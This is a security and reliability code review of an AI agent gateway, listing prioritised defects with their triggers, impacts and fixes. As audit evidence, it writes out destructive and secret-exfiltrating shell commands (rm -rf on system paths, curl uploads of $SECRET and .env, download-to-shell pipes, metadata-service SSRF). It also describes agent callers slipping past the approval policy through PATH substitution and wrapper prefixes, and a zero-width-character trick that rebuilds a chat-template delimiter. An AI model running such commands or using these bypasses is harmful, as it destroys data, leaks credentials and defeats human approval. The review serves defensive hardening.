# omo-gateway Code Review — 2026-09-14

## Verdict

This codebase is not ready for another deployment without fixing its local execution boundary and silent state-loss paths. Its dominant defect is incorrect ownership of state and work: requests are acknowledged before durable completion, old snapshots overwrite newer state, and cancellation drops the owner without finishing cleanup. The loopback dashboard lets another local account drive privileged APIs, while executable selection and wrapper-sensitive deny matching undermine terminal approval policy. Normal compression, cron destination changes, bot updates, reset/reload, and MCP UTF-8 chunking can silently lose or corrupt intended data; the supplied Docker image cannot even build. Fix local authentication and execution-policy bypasses first, repair the Docker target and deterministic corruption paths next, then harden lifecycle, recovery, and resource budgets rather than treating clean Rust checks as a release signal.

## Scope and method

- Supplied target: branch `main`, HEAD `74275fb`; **77 Rust files / 52,327 physical LOC in `src/`**, plus the React dashboard in `web/`, relevant tests, migrations, and deployment configuration. Module groups are itemized below.
- **20 parallel read-only lanes**, re-graded by **3 aggregators**. This consolidation read all three aggregate files in full and re-adjudicated **347** retained findings. `agg-data.md` was updated during consolidation with its seven previously missing tools-context findings; these additions are included. All 20 lane reports are accounted for in the updated aggregate coverage statements.
- Supplied static-check result: `cargo fmt`, `cargo clippy --all-targets --all-features -- -D warnings`, and `cargo check --all-targets` **all exited 0 with zero warnings**. Every finding below concerns behavior, configuration, UI, or verification logic that these Rust toolchain checks cannot catch. These results and the full-tree scope totals are supplied evidence, not commands rerun here; no build, live exploit, fault injection, or test suite was run during final consolidation.
- Source-backed consolidation was chosen over mechanical severity copying. Primary citations were checked using `sed -n '<LINE>p' /Users/indo/code/project/omon-gateway/<path>`; disputed high-impact claims were also checked in surrounding source. Secondary citations and cross-cutting, positive, and dropped-claim examples receive the same line verification. No unresolved citation is retained as finding evidence.
- P0 requires reachable production authorization bypass, ordinary silent corruption, or directly reachable bounded-input memory amplification. Dependency failures, narrow races, unusual input, sustained load, and demonstrated test flakiness are P1; speculative policy gaps and maintenance/coverage issues are P2. Docker is P0 by the lead's explicit deployment-blocker override. Tools-exec's claimed 18 P0 findings reduce to **2**; multiplexer’s claimed 16 reduce to **1**; cron-scheduler’s claimed 11 reduce to **2**. Oversized-file and pathological child-output OOM claims are P1, not evidence of routine-output exhaustion.
- Three early recovery-marker findings, two unused authorization-helper findings, and the dashboard authentication/HTTP-CSRF pair are consolidated. Other independently repairable defects remain separate. Within each severity, host/process-wide and cross-session effects precede shared durable-state defects, individual operation failures, and UI/test-only effects.
- **Final inventory: 343 findings — P0 11 / P1 273 / P2 59.** Counts represent consolidated primary findings, not affected call sites. Public-helper-only defects and unproven upstream protocol behavior are distinguished from demonstrated production paths.

## P0 — fix before the next deploy

### Loopback administration lacks per-user authentication and HTTP CSRF protection
- Location: src/dashboard.rs:698
- What: Administrative APIs trust loopback reachability rather than user credentials, while src/dashboard.rs:229 checks Origin only on WebSocket upgrades.
- Trigger: Any local process, including another unprivileged OS account, calls POST /api/approvals/{id}/resolve or POST /api/sessions/{id}/chat; a malicious page loaded by a browser on the machine submits a no-body mutation such as a known session stop when that browser permits loopback requests.
- Impact: Local unprivileged actors can approve or initiate gateway work, and browser pages can cause unauthorized mutations; non-loopback Host requests receive 403 and cross-origin WebSocket upgrades are rejected, so this is not unrestricted remote-network RCE.
- Fix: Authenticate administrative HTTP and WebSocket APIs with per-user credentials or securely provisioned tokens, check actor authority, and enforce same-origin plus anti-CSRF protection on HTTP mutations; retain existing Host and WebSocket Origin checks.

### Caller environment can replace the approved executable
- Location: src/tools/terminal.rs:369
- What: Environment overrides are applied after approval and bare program names remain subject to PATH lookup.
- Trigger: An agent caller supplies program echo with env PATH pointing to a directory containing a substituted executable; it can first copy an existing executable into its writable workspace under that name.
- Impact: Smart approval evaluates benign echo while a different executable runs with gateway permissions, bypassing the approval boundary without operator reconfiguration.
- Fix: Resolve the executable before approval and forbid caller overrides of executable-search, loader-injection, and gateway identity variables.

### Wrapper prefixes bypass configured unconditional denies
- Location: src/security/hardline.rs:181
- What: User deny globs are anchored to whole variants rather than each wrapper-stripped executable command.
- Trigger: With APPROVALS_DENY containing `npm publish *`, an agent/tool caller invokes TerminalTool with program env and args npm, publish, --access, public under smart approval.
- Impact: The configured unconditional denial is bypassed and the permitted gateway account can publish using its existing credentials; no privileged operator action is needed to rephrase the call.
- Fix: Match the deny rule against parsed wrapper-stripped executable argv as well as any intentionally supported whole-script form.

### Detection variants multiply a small input into gigabytes
- Location: src/security/normalize.rs:1035
- What: Each changed command word retains two almost-full-script copies without an aggregate variant budget.
- Trigger: A caller submits a cron prompt or direct script containing `'true';` 16,000 times: 112,000 bytes and 16,000 separators pass the public limits.
- Impact: String content alone can exceed 3.58 GB in one classification, exhausting a realistically sized gateway without a failed dependency.
- Fix: Cap total variant count and retained bytes before copying, returning a parser-limit finding on exhaustion.

### Every Docker build requests a nonexistent binary target
- Location: Dockerfile:8
- What: Dockerfile builds omon-gateway while Cargo.toml:18 declares omo-gateway; Dockerfile:21 and Dockerfile:32 retain the stale executable name.
- Trigger: Build the supplied Dockerfile with its cargo build --locked --release --bin omon-gateway instruction.
- Impact: The Cargo target does not exist, so the supplied container image cannot be built or deployed.
- Fix: Use omo-gateway consistently in the build target, COPY source/destination, healthcheck, and ENTRYPOINT.

### Fan-out sends every destination to the job's stored session
- Location: src/cron/scheduler.rs:1674
- What: Fan-out delivery reuses the stored session instead of constructing each destination's session.
- Trigger: A normal job has a valid session for channel A and configured destinations A and B.
- Impact: Both dispatches go to A while B silently receives nothing and delivery records can claim the wrong destination.
- Fix: Build the dispatch session from each destination, including bot identity. Reuse a stored session only after validating its channel, thread, and bot against that destination, as the mirror helper already does.

### Updating a registered job silently retains its old session key
- Location: src/cron/scheduler.rs:764
- What: Re-registering an existing job omits session_key from its conflict update.
- Trigger: An operator updates an existing job ID from conversation A to conversation B with a new CronJobSpec.session_key.
- Impact: The acknowledged update silently retains A and subsequent execution or delivery uses the wrong conversation.
- Fix: Include session_key = excluded.session_key in the conflict update.

### Partial updates in update_bot silently wipe unprovided fields to NULL
- Location: src/dashboard.rs:1927
- What: Partial bot updates bind omitted optional fields as SQL NULL instead of retaining stored values.
- Trigger: A normal client sends PUT /api/bots/{id} with only a new name for a bot that already has model, system_prompt, and enabled_toolsets.
- Impact: Existing bot configuration is silently erased by a successful update.
- Fix: Preserve stored model, system_prompt, and enabled_toolsets when omitted; distinguish omission from explicit null if intentional clearing is supported.

### TOCTOU in `/compress` causes silent data loss of messages arriving during summarization
- Location: src/discord/commands.rs:1092
- What: Compression deletes all session messages rather than only the snapshot it summarized.
- Trigger: A user or assistant appends messages while an ordinary /compress LLM summary is in flight, before the final DELETE.
- Impact: New unsummarized messages are permanently erased during a normal conversation operation.
- Fix: Capture the snapshot maximum sequence before summarization and delete only sequence <= that cutoff in the summary transaction, preserving later rows and correct summary ordering.

### Explicit reset restores the remote conversation binding it removed
- Location: src/multiplexer/actor.rs:758
- What: The flush query restores an existing database thread binding whenever reset supplies state without that binding.
- Trigger: A user resets an idle session with a persisted `metadata.omo_thread_id`, then the actor is reloaded after collection or restart.
- Impact: The acknowledged reset does not sever conversation continuity; subsequent turns recover pre-reset remote context, silently corrupting the requested session state.
- Fix: Give reset an explicit binding-deletion write and invalidate the backend binding cache; do not merge the old turn's binding after active reset.

### MCP SSE chunk decoding silently corrupts valid UTF-8
- Location: src/tools/mcp.rs:308
- What: Each network chunk is independently decoded with from_utf8_lossy before line assembly.
- Trigger: A normal SSE result contains a non-ASCII filename and TCP/HTTP chunks split one of its multibyte UTF-8 characters.
- Impact: Valid protocol data is silently changed to replacement characters and returned successfully, constituting normal-operation data corruption.
- Fix: Buffer bounded raw bytes to complete SSE frames or use an incremental UTF-8 decoder; reject genuinely invalid UTF-8.

## P1 — fix soon

### Daemon readiness buffers the entire HTTP response
- Location: src/agent/omo_daemon.rs:54
- What: A status-only probe reads to EOF into an uncapped Vec.
- Trigger: A faulty or substituted local endpoint streams a large body within the two-second probe window.
- Impact: Large allocations can exhaust memory under adverse dependency behavior; normal readiness responses do not establish a P0 exhaustion path.
- Fix: Read and parse only a bounded status line/header and stop without consuming the body.

### Execution tasks and their retained payloads have no concurrency bound
- Location: src/cron/scheduler.rs:1137
- What: Due and manually triggered jobs spawn without a shared concurrency bound.
- Trigger: Many distinct jobs become due while their commands or backends remain slow or never finish.
- Impact: Active tasks, payload snapshots, and child processes accumulate under sustained load.
- Fix: Acquire a bounded execution permit before claiming/spawning and page due-job selection. Add an execution deadline/cancellation policy so permanently stuck jobs cannot occupy capacity indefinitely.

### Shell output is accumulated without a size limit
- Location: src/cron/scheduler.rs:446
- What: The scheduler's direct shell-command path collects all output and has no execution deadline.
- Trigger: An operator schedules a command such as yes or an accidentally endless verbose script.
- Impact: The running child can exhaust gateway memory; this is an accepted pathological command, not routine input or an unprivileged exploit.
- Fix: Read child pipes incrementally with explicit byte limits and a bounded execution lifetime, reporting truncation or terminating the process when the limit is exceeded.

### Shutdown holds the task mutex across an unbounded join
- Location: src/cron/scheduler.rs:700
- What: Shutdown holds the task mutex while joining and later awaits executions without a deadline.
- Trigger: A due-job sweep blocks or an executing command never completes when shutdown starts.
- Impact: Lifecycle queries block and shutdown may never return; ordinary steady-state process deadlock is not demonstrated.
- Fix: Take the handle in a separate scoped statement, drop the guard before awaiting it, and implement bounded cancellation/join behavior for both the polling loop and executions.

### Unexpected server exit leaves standalone runtime waiting for shutdown
- Location: src/dashboard_runtime.rs:206
- What: Standalone runtime waits only for cancellation before observing the server task.
- Trigger: After successful listener binding, the server task panics or unexpectedly exits without cancelling the token.
- Impact: The process remains alive without a serving task until explicit shutdown; bind failure itself already propagates.
- Fix: Select between cancellation and server-task completion; unexpected completion must cancel the runtime and enter scheduler/resource cleanup.

### Oversized tables can cause excessive rasterization allocation
- Location: src/discord/table_render/mod.rs:313
- What: Table rasterization derives an unchecked canvas size from row and column counts.
- Trigger: An agent emits an unusually large markdown table, such as 250 columns by 1000 rows, before outbound chunk limiting.
- Impact: Rasterization can demand tens of gigabytes; size-validation errors are handled, but allocation pressure can still exhaust memory.
- Fix: Enforce maximum limits on table rows (e.g., max 50 rows) and columns (e.g., max 10 columns), or cap total rendered width (e.g., 1920 px) and height (e.g., 4000 px). If a table exceeds these bounds, truncate rows/columns with an indicator or bypass PNG rendering and keep the raw text.

### DashMap guards span actor and database awaits
- Location: src/multiplexer/router.rs:413
- What: Model/reset/context operations and the resume-marker iterator retain synchronous shard guards across awaits.
- Trigger: While an actor reply or SQLite operation is pending, enough insert/remove operations contend on the held shards to block runtime workers.
- Impact: Worker starvation can prevent the awaited continuation and stall the service; the production multi-worker hang needs contention, not just one ordinary lookup.
- Fix: Clone Arc handles and snapshot owned keys before any await so DashMap guards are dropped first.

### A cancelled drain update still exits the gateway
- Location: src/main.rs:893
- What: The one-shot select exits even when the observed drain value is false or its channel closes.
- Trigger: Marker creation and removal coalesce before main polls the watch update, leaving the current value false.
- Impact: Scheduler and pool shutdown proceed without the branch's checkpoint and shard-shutdown operations.
- Fix: Loop over false updates and report channel closure separately; leave the loop only for an actual drain or another termination cause.

### Dashboard failure drops the running gateway future
- Location: src/entry.rs:98
- What: Dashboard completion returns from the outer select without driving gateway cleanup.
- Trigger: The optional dashboard fails to bind its occupied HTTP port after concurrent gateway initialization has begun.
- Impact: Recovery or scheduled work may be abandoned without the normal persistence and shutdown sequence.
- Fix: Send shared cancellation to the gateway and await its cleanup before returning the original dashboard error.

### Database closure is not ordered after interactive actor shutdown
- Location: src/main.rs:906
- What: Cleanup closes SQLite without cancelling/draining and joining interactive actors.
- Trigger: An interactive turn remains active when shutdown reaches pool closure.
- Impact: Late transcript/state writes fail or runtime teardown drops the turn; preceding unbounded joins can also stall termination.
- Fix: Close admissions, checkpoint or drain actors, join them with an overall deadline, and close SQLite last.

### Discord task failure becomes successful process exit
- Location: src/main.rs:881
- What: The first client completion leaves the select, logging ordinary errors and ignoring JoinError without retaining failure status.
- Trigger: One client returns an error or its task panics while other clients/turns remain active.
- Impact: All bots stop without signal-branch checkpointing, and the supervisor receives a successful gateway result.
- Fix: Match all task outcomes, retain the original error, and run common shutdown before returning failure.

### Production startup never acquires the runtime ownership lock
- Location: src/entry.rs:81
- What: Gateway entry bypasses the ownership-lock helper, whose acquisition calls occur only in tests.
- Trigger: A duplicate launch or overlapping deployment starts two processes against the same workspace/database and Discord identities.
- Impact: Independent consumers and schedulers can execute the same work concurrently.
- Fix: Acquire and retain a lock keyed by the actual shared runtime identity before starting gateway subsystems.

### SIGTERM bypasses gateway graceful shutdown
- Location: src/main.rs:885
- What: The gateway subscribes only to Ctrl+C and only after initialization.
- Trigger: A service manager sends SIGTERM while a turn is active, or SIGINT arrives before signal registration.
- Impact: Pending-session marking and orderly subsystem shutdown are bypassed; interrupted work is less recoverable.
- Fix: Register Unix SIGTERM and SIGINT at entry and carry one cancellation signal through startup and cleanup.

### Scanner response decoding has no byte limit
- Location: src/security/tirith.rs:127
- What: Successful Tirith responses are buffered as arbitrary JSON before any field bounds.
- Trigger: A faulty or compromised configured scanner sends a very large successful response within the request timeout.
- Impact: Dependency-controlled response size can exhaust gateway memory.
- Fix: Enforce a streamed byte cap before JSON decoding and route oversize responses through the configured failure policy.

### Wildcard matching allocates a length-product matrix
- Location: src/security/hardline.rs:146
- What: Every wildcard candidate allocates O(pattern length times command length) cells.
- Trigger: A configured 1,024-character rule meets an accepted 120,000-character command, especially across concurrent checks.
- Impact: Approximately 123 MB of cells per match causes load-dependent allocation and CPU pressure.
- Fix: Use linear-space wildcard matching and bounded pattern and candidate sizes.

### Skill filesystem writes hold the sole DB connection
- Location: src/storage/db.rs:877
- What: Synchronous skill-directory creation and writing occur inside an open database transaction.
- Trigger: An approved skill write hits slow or stalled storage while other tasks need the single-connection pool.
- Impact: Database work queues behind filesystem latency and an async worker is blocked.
- Fix: Offload filesystem work and use a durable claim/finalize protocol to avoid holding the DB transaction during it without losing replay safety.

### Oversized skill reads have no memory or async-I/O bound
- Location: src/tools/skills.rs:196
- What: The skill read action synchronously loads the complete discovered SKILL.md and returns its contents without a size cap.
- Trigger: A configured skill directory contains an accidentally generated or planted multi-gigabyte UTF-8 SKILL.md and the caller requests that skill by name.
- Impact: This atypical skill file can exhaust gateway memory and block an async executor worker during the read; no skill write-path escape is asserted.
- Fix: Read through a regular-file handle with an enforced byte ceiling using async I/O or the blocking pool, and reject oversized skills before returning their contents; metadata alone is insufficient to enforce a read budget.

### Web responses are buffered before output limits
- Location: src/tools/web.rs:180
- What: Web fetch decodes the entire response before applying max_chars, and web search likewise buffers provider HTML before limiting results.
- Trigger: The reader/search provider returns an oversized successful body quickly enough to fit within its configured 15-second/10-second request timeout.
- Impact: A large or faulty dependency response can exhaust memory before output truncation; reqwest's total request timeout also covers body consumption but does not impose a byte budget.
- Fix: Stream both response paths under a hard byte cap before decoding, then apply the character/result limits; treat Content-Length only as an optional early rejection, not the enforcement boundary.

### Browser navigation accumulates unowned tabs
- Location: src/tools/browser.rs:103
- What: Every navigation creates a new CDP target and no action closes or reuses it.
- Trigger: Sustained repeated navigation against a persistent CDP browser.
- Impact: Tabs and their background work accumulate until browser/host resources are exhausted; no ordinary-uptime growth measurement was supplied.
- Fix: Reuse a session-owned target and close it on replacement/teardown under a target quota.

### File reads buffer entire large files before limiting output
- Location: src/tools/file.rs:77
- What: The read operation allocates the complete regular file before comparing its size to the display limit.
- Trigger: A caller reads an accessible multi-gigabyte build artifact or sparse file on a gateway with less available memory.
- Impact: The oversized-file edge condition can exhaust memory despite the 200,000-byte response limit.
- Fix: Open a validated regular-file handle and read bounded head/tail slices rather than the entire file.

### MCP transports accept unbounded frames and bodies
- Location: src/tools/mcp.rs:149
- What: Stdio lines, SSE buffers, and ordinary JSON bodies have no pre-decode byte limit.
- Trigger: A configured MCP server sends a newline-free large frame or oversized response.
- Impact: A misbehaving dependency can exhaust gateway memory despite elapsed-time limits.
- Fix: Enforce frame and aggregate response limits before buffering/deserialization on every transport.

### Terminal output is unbounded before truncation
- Location: src/tools/terminal.rs:372
- What: Command::output buffers complete stdout and stderr before the configured capture limit is applied.
- Trigger: A permitted invocation runs an unusually verbose or nonterminating child such as yes during the default 600-second timeout.
- Impact: Full output buffering can exhaust memory before truncation; this requires pathological child output, not an established routine-output exhaustion rate.
- Fix: Drain both pipes concurrently into bounded buffers from process start and terminate on an aggregate capture budget.

### Approval handling precedes thread and turn ownership checks
- Location: src/agent/omo_backend.rs:880
- What: Reverse approval requests use the current session's policy without first validating request ownership.
- Trigger: A peer sends an approval for another thread/turn on a YOLO session's connection, including before start acknowledgement.
- Impact: The client can approve misattributed work; no ordinary unprivileged actor's ability to inject those frames was demonstrated.
- Fix: Correlate ownership before approval policy evaluation and reject or bounded-buffer unattributable pre-ACK requests.

### Live-owner reclamation has no execution fence and is vulnerable to clock jumps
- Location: src/cron/scheduler.rs:53
- What: Lease loss does not fence the old executor from delivery or other side effects.
- Trigger: A large forward clock step or long owner stall causes live-owner reclamation before the old executor resumes.
- Impact: Original and replacement runs can both act externally.
- Fix: Detect lease loss from rows_affected, cancel lease-lost executions, and fence delivery/external effects using the active claim token. Do not treat elapsed wall-clock time alone as permission for a live owner and a replacement to both act.

### Reclamation can invalidate a lease that was refreshed after selection
- Location: src/cron/scheduler.rs:1037
- What: Lease reclamation does not compare the lease value observed during selection.
- Trigger: The owner refreshes a selected expired lease before the reclaimer updates it.
- Impact: A live execution is invalidated and a replacement can overlap it.
- Fix: Compare-and-swap the observed lease_expires_at, and any owner identity used for the decision, in the reclaim UPDATE; abandon reclamation if the row changed.

### Media root checks authorize sibling directories
- Location: src/discord/adapter.rs:64
- What: String-prefix checks admit files in sibling directories outside the authorized temporary roots.
- Trigger: A MEDIA directive names a readable existing /tmp-private/report.txt outside the workspace and other deny rules.
- Impact: The adapter can upload a file outside its advertised roots on that filesystem layout.
- Fix: Use component-aware `Path::starts_with` against canonical authorized root paths for every alternative; do not use string prefixes.

### Media upload reopens an unbounded, untyped file source
- Location: src/discord/adapter.rs:1855
- What: Media upload reads the entire validated pathname without a regular-file or byte limit and reopens it after validation.
- Trigger: A generated file exceeds the upload limit, a permitted path names a FIFO, or a local writer swaps the validated pathname before upload.
- Impact: Uploads can exhaust memory or stall; pathname replacement can also substitute an unauthorized file.
- Fix: Require a regular file and enforce the effective upload limit with a bounded read; open under a component-safe policy and validate/upload that same handle rather than reopening a mutable pathname.

### A resolved approval can resurrect grants after session clear
- Location: src/discord/approval.rs:388
- What: A resolved decision can publish a grant after clear_session removes the session's state.
- Trigger: Resolution removes the pending entry, clear_session completes, then the waiting requester resumes and caches Session or Always.
- Impact: Cleared authorization can be restored by a stale request.
- Fix: Associate requests and grants with a session generation. Increment it on clear and atomically reject stale generations when publishing a grant; carry that generation to the execution boundary so a clear between approval return and execution cannot use the old authorization.

### Import-only migration leaves both schedulers eligible
- Location: src/migrate/mod.rs:182
- What: The no-cutover path leaves enabled hermes_mirror jobs in SQLite while Hermes remains active.
- Trigger: An operator runs migration with --no-cutover and subsequently runs Omon alongside Hermes with a due imported job.
- Impact: Both schedulers can execute the job and duplicate side effects; this is an explicit operational-mode edge condition.
- Fix: Keep pre-cutover imports non-executable until ownership transfer commits, without changing source enablement intent.

### Recovery mistakes another live instance's start time for stale ownership
- Location: src/ledger/service.rs:493
- What: A live owner's stored start time is compared to the current process's start time rather than that owner's identity.
- Trigger: Two gateway processes share SQLite; one sweeps obligations owned by the other, whose start timestamp differs.
- Impact: The sweeper can steal and replay work still being delivered by the live owner.
- Fix: Do not reclaim another live PID solely for a different local start timestamp; use a verified owner identity or expiring lease/heartbeat.

### Optional dashboard controls separate runtime handles
- Location: src/entry.rs:87
- What: The optional dashboard constructs its own multiplexer, approval guard, scheduler, and dispatcher instead of attaching to the gateway's instances.
- Trigger: Dashboard mode is enabled alongside Discord and an operator stops a live Discord turn, answers its approval, or manually executes cron through the dashboard.
- Impact: Live actor and approval operations target different in-memory owners, and manual cron uses dashboard egress rather than gateway egress.
- Fix: Construct the runtime once and inject its actual handles into an attached dashboard; reserve standalone construction for dashboard-only commands.

### Existing hard-link aliases share write side effects
- Location: src/tools/file.rs:130
- What: An existing regular file is accepted even when its inode is linked outside the root.
- Trigger: A same-filesystem hard link to another gateway-writable file already exists in the workspace.
- Impact: Writing the workspace alias also changes the outside file; this needs an alias/import precondition, not a symlink race.
- Fix: Replace through a fresh inode and atomic rename; use filesystem isolation if reads through imported hard links must be prohibited.

### Model-supplied browser URLs reach loopback and link-local services
- Location: src/tools/browser.rs:95
- What: Navigation passes the model-supplied URL to CDP /json/new without a destination-host policy; HTTP(S) schemes are explicitly checked at src/tools/browser.rs:97.
- Trigger: A caller navigates to http://127.0.0.1:9119/ or http://169.254.169.254/ where a local or metadata service is reachable from the browser host.
- Impact: The browser makes attacker-directed loopback/link-local requests (SSRF); disclosure or state changes depend on the reached endpoint, so unconditional P0 exploitation is not established.
- Fix: Reject disallowed hosts and resolved private/loopback/link-local addresses before navigation and enforce the same egress policy for DNS, redirects, and subresources at the browser/network boundary.

### Path-based in-place file writes are racy and non-atomic
- Location: src/tools/file.rs:137
- What: The checked pathname is reopened for an in-place truncating write.
- Trigger: A workspace writer replaces a checked ancestor before open, or ENOSPC occurs after truncation, or two writes overlap.
- Impact: Outside files can be affected in the path race, and ordinary write failures can destroy the previous contents.
- Fix: Use pinned directory handles, no-follow/beneath-root traversal, and a complete temporary sibling atomically renamed over the destination.

### Shared browser snapshots lack session filtering
- Location: src/tools/browser.rs:87
- What: Snapshot returns the configured CDP instance's complete page list.
- Trigger: Two sessions share a BrowserTool/CDP profile and one requests snapshot after the other opens a sensitive URL.
- Impact: The first session sees the other's titles, URLs, and debugger metadata; shared deployment is required.
- Fix: Use session-owned browser contexts/targets and return only that session's tracked pages.

### Terminal deadlines do not own descendant processes
- Location: src/tools/terminal.rs:356
- What: Kill-on-drop applies to the immediate child rather than an isolated process tree.
- Trigger: An allowed child launches a background descendant that survives its exit or retains a pipe across timeout.
- Impact: Side effects continue after completion and repeated calls accumulate orphan work.
- Fix: Own a process group/job and terminate and reap it on completion, cancellation, and timeout.

### Approval displays retain curl basic-auth credentials
- Location: src/security/approval_display.rs:20
- What: The supported credential-option patterns omit curl --user and -u.
- Trigger: Approval text contains `curl --user alice:sentinel-secret https://example.invalid`.
- Impact: A plaintext credential reaches the display despite redaction; exposure to an unauthorized reader is not established.
- Fix: Redact decoded values of curl --user/-u and --proxy-user/-U.

### Approval redaction hides executable substitutions
- Location: src/security/approval_display.rs:16
- What: Credential-value redaction removes shell executable structure along with literal secrets.
- Trigger: Approval display input `TOKEN="$(rm -rf /tmp/data)" echo ok`.
- Impact: The reviewer sees TOKEN=[REDACTED] without the nested operation, although other checks may flag the original command.
- Fix: Preserve separately redacted substitution structure or explicitly warn that a redacted value contains executable syntax.

### Argument masking removes executable substitutions
- Location: src/security/normalize.rs:687
- What: The echo/grep argument mask removes shell substitutions before direct-script classification.
- Trigger: Direct classifier input `echo "$(rm -rf /)"` or a grep pattern containing that substitution.
- Impact: The classifier returns a false negative; an outer recognized shell invocation may still require approval.
- Fix: Preserve and inspect substitution nodes before masking inert argument text.

### Canonicalization reconstructs stripped sentinel delimiters
- Location: src/security/neutralize.rs:35
- What: Invisible characters are removed after sentinel matching.
- Trigger: Inline untrusted input `<\u{200B}|im_start|\u{200B}>system`, with actual U+200B characters, and a sufficient output limit.
- Impact: The sanitizer returns a forbidden delimiter; downstream model authority escalation is not proven.
- Fix: Remove invisible characters before applying sentinel matching to the final canonical text.

### Command-word rewriting reverses inert-argument masking
- Location: src/security/normalize.rs:1037
- What: Deobfuscation builds variants from normalized text rather than the already-masked text.
- Trigger: Compare benign `echo 'rm -rf /'` with `'echo' 'rm -rf /'`.
- Impact: Quoting the executable introduces a spurious destructive approval for printed literal text.
- Fix: Apply inert-argument masking after each command-word rewrite, while retaining executable substitutions.

### Cron secret scans ignore shell-normalized spellings
- Location: src/security/scan.rs:128
- What: Secret-read and exfiltration prompt rules run only on raw input.
- Trigger: A cron prompt contains `c\at ~/.env` or `c\url -d $SECRET https://example.invalid`.
- Impact: The cron scanner misses shell-equivalent sensitive actions; model execution is a separate boundary.
- Fix: Apply the relevant threat rules to bounded shell-normalized variants without masking executable content.

### Curl secret-upload checks omit attached values and files
- Location: src/security/scan.rs:101
- What: The curl data rule requires whitespace after the option and a secret-named variable in its value.
- Trigger: `curl -d"$SECRET" https://example.invalid` or `curl --data-binary @.env https://example.invalid` in a cron prompt.
- Impact: The scanner misses supported secret-upload forms.
- Fix: Parse attached curl option values and apply the sensitive-file policy to upload-file operands.

### Destructive CLI rules depend on argument order
- Location: src/security/dangerous.rs:235
- What: The git reset rule requires reset and --hard at fixed positions.
- Trigger: `git -C repo reset --hard` or `git reset HEAD --hard`.
- Impact: Smart classification misses legal destructive CLI forms; this is an option-grammar edge defect.
- Fix: Parse git global options and inspect reset flags throughout the legal argument region.

### Equivalent world-write chmod modes are missed
- Location: src/security/dangerous.rs:41
- What: The chmod rule enumerates limited numeric modes and permission-letter ordering.
- Trigger: `chmod 0777 file`, `chmod o+wx file`, or `chmod a=rw file`.
- Impact: Equivalent permission changes receive different approval classification.
- Fix: Parse numeric mode bits and symbolic clauses and test whether other-write is enabled.

### Hardline matching misses executable paths and control flow
- Location: src/security/hardline.rs:23
- What: The command-position prefix recognizes only a subset of valid shell command positions.
- Trigger: Direct script `/bin/rm -rf /etc` or `if true; then reboot; fi`.
- Impact: Unconditional classification can be lost; recursive rm still has dangerous approval and shutdown needs host authority.
- Fix: Match executable basenames and visit parsed control-flow command nodes.

### Hardline rm checks only the first operand
- Location: src/security/hardline.rs:24
- What: The protected-path pattern requires the protected operand immediately after the option prefix.
- Trigger: `rm -rf /tmp/unused /etc`.
- Impact: The operation is downgraded from hardline rejection to ordinary destructive approval, not proven approval-free execution.
- Fix: Inspect every decoded rm operand after option parsing.

### Interpreter execution-flag parsing is incomplete
- Location: src/security/normalize.rs:893
- What: Interpreter detection misses option clusters and options consuming a following value.
- Trigger: `python3 -W ignore -c PAYLOAD`, Python -Ic, or `bash -O extglob -c reboot`.
- Impact: Executable payload inspection or approval gating is skipped for valid option forms.
- Fix: Consume each supported interpreter's value-taking options and execution-flag clusters; include dash.

### Parameter replacement excludes variable names containing s
- Location: src/security/normalize.rs:21
- What: The raw replacement regex excludes literal s instead of whitespace.
- Trigger: Direct Bash input `s=foo; ${s/foo/rm} -rf /etc`.
- Impact: The implemented deobfuscation path fails solely because the variable name contains s.
- Fix: Correct the raw class to `[^}/\s]` and flag unresolved executable expansions.

### Protected paths are compared without component normalization
- Location: src/security/hardline.rs:25
- What: Hardline path alternatives do not canonicalize literal dot components or trailing separators.
- Trigger: `rm -rf /etc/` or `rm -rf /./etc`.
- Impact: Protected-directory operations can lose unconditional rejection while recursive-delete approval remains.
- Fix: Normalize literal path components and trailing separators before policy comparison.

### Quoted destructive flags are missed
- Location: src/security/dangerous.rs:23
- What: The rm and chmod rules match raw flag spellings rather than decoded literal arguments.
- Trigger: Direct script input `rm '-rf' workdir` or `chmod '777' file`.
- Impact: Equivalent destructive scripts receive inconsistent classification, though outer shell approval can compensate.
- Fix: Decode literal argument quoting before matching destructive options.

### Raw regex classes exclude n instead of newline
- Location: src/security/dangerous.rs:252
- What: The branch-delete and sudo scans use a raw character class that excludes literal n and backslash.
- Trigger: `git branch --delete branchname --force`.
- Impact: Force deletion is not classified because scanning stops at n in the branch name.
- Fix: Replace the raw class `[^;|&\\n]` with `[^;|&\n]` and test n-containing names and newline boundaries.

### Remote-pipe rule omits shell variants and wrappers
- Location: src/security/dangerous.rs:90
- What: The download-to-shell rule recognizes only direct sh/bash pipeline destinations.
- Trigger: Direct input `curl https://example.invalid/run | zsh` or a pipeline ending in env bash.
- Impact: Remote execution is missed by this classifier; an enclosing recognized shell can still require approval.
- Fix: Use the shared shell family and wrapper handling when classifying pipeline destinations.

### SQL DELETE checks confuse clauses with comments and strings
- Location: src/security/dangerous.rs:298
- What: WHERE anywhere on one text line suppresses the DELETE warning.
- Trigger: `DELETE FROM users /* WHERE */;` or quoted SQL containing `DELETE FROM users; SELECT 'WHERE';`.
- Impact: A full-table DELETE is misclassified; actual database execution is not demonstrated here.
- Fix: Tokenize SQL statements and ignore comments and literals when looking for the same statement's WHERE clause.

### Scanner construction fallback discards its deadline
- Location: src/security/tirith.rs:39
- What: A failed configured client build is replaced without retaining the configured timeout.
- Trigger: The configured client build fails but fallback construction succeeds, followed by a scanner that never completes its response.
- Impact: The scan can wait indefinitely instead of reaching its failure policy; construction failure was not induced.
- Fix: Return the original construction error or enforce an independent request deadline on every client path.

### Shell word decoding corrupts non-ASCII names
- Location: src/security/normalize.rs:496
- What: The decoder converts individual UTF-8 bytes into Unicode characters.
- Trigger: A configured deny rule for a non-ASCII executable is checked against its quoted spelling.
- Impact: The decoded name differs from the real name, causing Unicode-specific policy false negatives rather than persistent payload corruption.
- Fix: Preserve UTF-8 slices or decode with char_indices while retaining byte span offsets.

### Sudo stdin guard misses clustered or reordered options
- Location: src/security/hardline.rs:15
- What: The stdin guard recognizes only bare sudo immediately followed by -S.
- Trigger: With SUDO_PASSWORD absent, classify `sudo -n -S id` or `sudo -nS id`.
- Impact: The intended stdin prohibition is not applied; terminal stdin and sudo authorization can still prevent exploitation.
- Fix: Identify sudo after wrappers and recognize S in every supported option position.

### Unresolved executable expansions fail open
- Location: src/security/normalize.rs:112
- What: Backslash stripping and command-word decoding do not resolve ANSI-C or variable-based executable names.
- Trigger: Bash script `tool=rm; $tool -rf /etc` or an ANSI-C-quoted octal spelling of rm supplied directly to classification.
- Impact: The classifier misses the executable; actual shell invocation and host permissions remain prerequisites.
- Fix: Decode ANSI-C literals and return an explicit risk for unresolved command names.

